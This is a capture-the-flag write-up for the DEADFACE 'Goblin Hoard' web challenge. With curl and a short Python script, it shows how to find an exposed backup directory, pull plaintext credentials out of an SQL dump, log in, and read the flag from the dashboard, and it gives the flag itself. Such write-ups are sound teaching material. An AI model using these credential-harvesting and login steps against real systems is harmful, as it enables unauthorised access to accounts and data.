# Goblin Hoard – DEADFACE CTF
**Category:** `WEB`
## Challenge Description
<img src="images/Goblin_hoard
.png" alt="Dis-connec-ted" width="200"/> 
> DEADFACE claims to have information about De Monne Financial's investments. See if you can see their investments.
>>Submit the flag as deadface{$#.##} 
>>> http://env01.deadface.io:8888
## Target
- URL: `http://env01.deadface.io:8888/`
- Goal: Retrieve the investment flag (`deadface{$#.##}`)

## Steps

1. **Discover exposed backup directory**
   ```bash
   curl -s http://env01.deadface.io:8888/backup/
   ```
   Output lists `demonne_backup_20251015.sql`.

2. **Download the SQL backup**
   ```bash
   mkdir -p deadfaceCTF/web
   curl -s http://env01.deadface.io:8888/backup/demonne_backup_20251015.sql \
        -o deadfaceCTF/web/demonne_backup_20251015.sql
   ```

3. **Extract credentials from the dump**
   ```bash
   head deadfaceCTF/web/demonne_backup_20251015.sql
   # Contains entries like:
   # INSERT INTO users VALUES(1,'jreed80','J0nnyR#ed80!',...);
   ```
   Notably, user `jreed80` with password `J0nnyR#ed80!`.

4. **Log in using retrieved credentials**
   ```bash
   python3 - <<'PY'
   import urllib.request, urllib.parse, http.cookiejar
   cj = http.cookiejar.CookieJar()
   opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
   opener.open('http://env01.deadface.io:8888/login',
               urllib.parse.urlencode({'username':'jreed80',
                                       'password':'J0nnyR#ed80!'}).encode())
   html = opener.open('http://env01.deadface.io:8888/dashboard').read().decode()
   open('deadfaceCTF/web/dashboard_jreed80.html','w').write(html)
   PY
   ```

5. **Parse investment value from dashboard**
   ```bash
   grep -n 'Investments' -n deadfaceCTF/web/dashboard_jreed80.html
   # ... <div class="amount">$128,493.56</div>
   ```

6. **Submit flag**
   ```
   deadface{$128493.56}
   ```

## Artifacts
- `deadfaceCTF/web/demonne_backup_20251015.sql`
- `deadfaceCTF/web/dashboard_jreed80.html`

These contain the credentials and the authenticated dashboard output for verification.
